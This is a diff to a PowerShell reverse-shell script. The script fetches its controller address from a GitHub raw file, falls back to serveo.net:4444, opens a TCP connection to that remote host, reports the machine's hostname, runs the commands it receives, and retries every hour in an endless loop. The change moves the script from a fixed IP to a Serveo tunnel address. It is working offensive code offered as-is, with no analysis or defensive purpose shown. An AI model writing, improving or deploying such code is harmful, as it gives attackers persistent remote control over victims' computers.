@@ -1,37 +1,36 @@
-# Function to retrieve the updated IP address from a remote file (GitHub)
-function Get-DynamicIPAddress {
+function Get-DynamicServeoAddress {
     $githubUrl = "https://raw.githubusercontent.com/nkt420/winstf/main/hip.txt"
     try {
-        # Download the file containing the IP address
-        $ipAddress = Invoke-RestMethod -Uri $githubUrl -UseBasicParsing
-        return $ipAddress
+        # Get the Serveo address (e.g., serveo.net:4444) from the remote file
+        $serveoAddress = Invoke-RestMethod -Uri $githubUrl -UseBasicParsing
+        return $serveoAddress
     } catch {
-        # If the request fails, return the last known IP or a default value
-        Write-Host "Failed to retrieve IP. Using fallback IP."
-        return "192.168.0.100" # Fallback IP
+        # Fallback to a default Serveo address if the request fails
+        Write-Host "Failed to retrieve Serveo address. Using fallback."
+        return "serveo.net:4444"
     }
 }
 
-# Function to create a reverse shell
 function Start-ReverseShell {
     param (
-        [string]$ipAddress,
-        [int]$port
+        [string]$serveoAddress
     )
 
     try {
-        # Simple reverse shell using TCP
+        # Split the Serveo address into IP (or domain) and port
+        $addressParts = $serveoAddress -split ':'
+        $ipAddress = $addressParts[0]
+        $port = [int]$addressParts[1]
+
+        # Establish a TCP connection to Serveo
         $client = New-Object System.Net.Sockets.TCPClient
         $client.Connect($ipAddress, $port)
 
-        # Check if the connection is successful
         if ($client.Connected) {
             $stream = $client.GetStream()
             $writer = New-Object System.IO.StreamWriter($stream)
             $writer.AutoFlush = $true
             $buffer = New-Object System.Byte[] 1024
-
-            # Send basic system information to the remote server
             $hostname = [System.Net.Dns]::GetHostName()
             $writer.WriteLine("Connected from $hostname")
 
@@ -51,37 +50,28 @@ function Start-ReverseShell {
                     $writer.WriteLine("Error executing command: $_")
                 }
             }
-
-            # Close the connection after the session ends
             $client.Close()
         } else {
             throw "Connection failed to $ipAddress:$port"
         }
     } catch {
-        Write-Host "Failed to connect to $ipAddress:$port. Error: $_"
+        Write-Host "Failed to connect to $serveoAddress. Error: $_"
     }
 }
 
-# Main function
 function Main {
-    # Define the port to connect to
-    $port = 4444
-
     while ($true) {
         try {
-            # Retrieve the latest IP address
-            $ipAddress = Get-DynamicIPAddress
-            Write-Host "Retrieved IP Address: $ipAddress"
-
-            # Attempt to connect
+            # Retrieve the Serveo address dynamically
+            $serveoAddress = Get-DynamicServeoAddress
+            Write-Host "Retrieved Serveo Address: $serveoAddress"
             $connected = $false
-            $retryAttempts = 5 # Retry 5 times if connection fails
+            $retryAttempts = 5
 
             for ($i = 1; $i -le $retryAttempts; $i++) {
                 Write-Host "Attempting connection (Attempt $i/$retryAttempts)..."
-                Start-ReverseShell -ipAddress $ipAddress -port $port
+                Start-ReverseShell -serveoAddress $serveoAddress
 
-                # If a successful connection was made, set $connected to true
                 if ($client.Connected) {
                     $connected = $true
                     break
@@ -99,11 +89,8 @@ function Main {
             Write-Host "Error in Main loop: $_"
         }
 
-        # Wait for an hour before checking again (3600 seconds)
         Start-Sleep -Seconds 3600
     }
 }
 
-# Execute the Main function
 Main
-
